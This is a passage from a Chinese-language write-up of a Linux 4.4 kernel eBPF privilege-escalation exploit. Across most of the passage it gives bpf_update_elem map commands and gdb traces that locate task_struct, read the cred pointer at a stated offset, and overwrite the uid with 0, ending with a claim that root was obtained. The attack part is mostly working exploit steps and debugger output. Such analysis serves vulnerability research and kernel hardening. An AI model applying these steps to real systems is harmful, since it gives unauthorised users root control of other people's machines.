0xffff8800758c0000: 0x74343c00 0xffff8800 0x00000008 0x00000000
0xffff8800758c0010: 0x00000001 0x00000000 0xfffff000 0x00007fff
0xffff8800758c0020: 0x00000000 0x00000000 (gdb)
```

```
其中 rax 的值即为指向 task_struct 的指针，可以看到和 current 结构体的第一个成员的值是一致的，都是 0xffff880074343c00。
```

```
得到 task_struct 地址之后，加上 cred 的偏移 CRED_OFFSET=0x5f8（由于内核版本不通或者内核的编译选项不同，都可能导致 cred 在 task_struct 中的偏移不同），组装读取指令取读取指向 cred 结构体的指针地址：
```

```
bpf_update_elem(0, 2); 
```

```
bpf_update_elem(1, 0xffff880074343c00+0x5f8); 
```

```
bpf_update_elem(2, 0); 
```

```
过程如下：
```

```
(gdb) x/10i $rip => 0xffffffff811778b8 <__bpf_prog_run+3624>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778bd <__bpf_prog_run+3629>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff811778c1 <__bpf_prog_run+3633>:       movsx  rdx,WORD PTR [rbx+0x2] 0xffffffff811778c6 <__bpf_prog_run+3638>:       add    rbx,0x8
   0xffffffff811778ca <__bpf_prog_run+3642>:       movsxd rcx,DWORD PTR [rbx-0x4] 0xffffffff811778ce <__bpf_prog_run+3646>:       and    eax,0xf
   0xffffffff811778d1 <__bpf_prog_run+3649>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778d9 <__bpf_prog_run+3657>:       mov    QWORD PTR [rax+rdx*1],rcx 0xffffffff811778dd <__bpf_prog_run+3661>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778e2 <__bpf_prog_run+3666>:       lfence 
(gdb) i r $rax
rax 0xffff880074cb5e00        -131939435848192 (gdb) p (struct task_struct *)0xffff880074343c00 $15 = (struct task_struct *) 0xffff880074343c00 (gdb) p ((struct task_struct *)0xffff880074343c00)->cred
$16 = (const struct cred *) 0xffff880074cb5e00 (gdb) p &((struct task_struct *)0xffff880074343c00)->cred
$17 = (const struct cred **) 0xffff8800743441f8 (gdb) x/10x 0xffff880074343c00+0x5f8
0xffff8800743441f8: 0x74cb5e00 0xffff8800 0x00707865 0x65742d00
0xffff880074344208: 0x6e696d72 0x002d6c61 0x00000000 0x00000000
0xffff880074344218: 0x00000000 0x00000000 (gdb)
```

```
上图中 rax 的值 0xffff880074cb5e00 即为从 task_struct 中读取到的指向 cred 的指针。
```

```
cred 的地址得到了，再加上 uid 在 cred 中的偏移（固定为 4）便得到了 uid 的地址 0xffff880074cb5e04，然后构造写数据的 map 指令：
```

```
bpf_update_elem(0, 2); 
```

```
bpf_update_elem(1, 0xffff880074cb5e04); 
```

```
bpf_update_elem(2, 0); 
```

```
过程如下（由于第一次运行 exp 的时候，这里没断下来，所以下面的过程是第二次运行的过程，中间一些结构体的地址发生了稍微的变化）：
```

```
(gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
$38 = {val = 1000} //此时 uid 还是 1000
(gdb) ni 0xffffffff811778ac  856 LDST(DW, u64)
(gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
$39 = {val = 1000}
(gdb) ni 0xffffffff811778b4  856 LDST(DW, u64)
(gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
$40 = {val = 1000}
(gdb) ni
Thread 1 hit Breakpoint 13, 0xffffffff811778b8 in __bpf_prog_run (ctx=0xffff8800746c9d80, 
    insn=0xffffc900005b5168) at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/core.c:856
856 LDST(DW, u64)
(gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
$41 = {val = 0} //此时 uid 已经变为 0
(gdb) x/10i $rip-12
   0xffffffff811778ac <__bpf_prog_run+3612>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778b4 <__bpf_prog_run+3620>:       mov    QWORD PTR [rcx+rdx*1],rax //就是这里改变了 uid 的值
=> 0xffffffff811778b8 <__bpf_prog_run+3624>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778bd <__bpf_prog_run+3629>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff811778c1 <__bpf_prog_run+3633>:       movsx  rdx,WORD PTR [rbx+0x2] 0xffffffff811778c6 <__bpf_prog_run+3638>:       add    rbx,0x8
   0xffffffff811778ca <__bpf_prog_run+3642>:       movsxd rcx,DWORD PTR [rbx-0x4] 0xffffffff811778ce <__bpf_prog_run+3646>:       and    eax,0xf
   0xffffffff811778d1 <__bpf_prog_run+3649>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778d9 <__bpf_prog_run+3657>:       mov    QWORD PTR [rax+rdx*1],rcx
(gdb) x/1l ($rcx+$rdx*1)  //$rcx+$rdx*1 的值 0xffff880075b7ca84 即为 uid 的地址
0xffff880075b7ca84: Undefined output format "l".
(gdb) p &((struct task_struct*)0xffff880079afe900)->cred->uid
$43 = (kuid_t *) 0xffff880075b7ca84 (gdb) i r $rax //此时 rax 为我们需要些到 uid 地址的值 0
rax            0x0  0 (gdb)
```

提权成功：

![](img/0260629309b989a5ed2c669b4c8adea9.png)

```
到此整个漏洞利用完成，后面的部分写的有点仓促了，如果有错误的地方，还请各位朋友不吝赐教。
```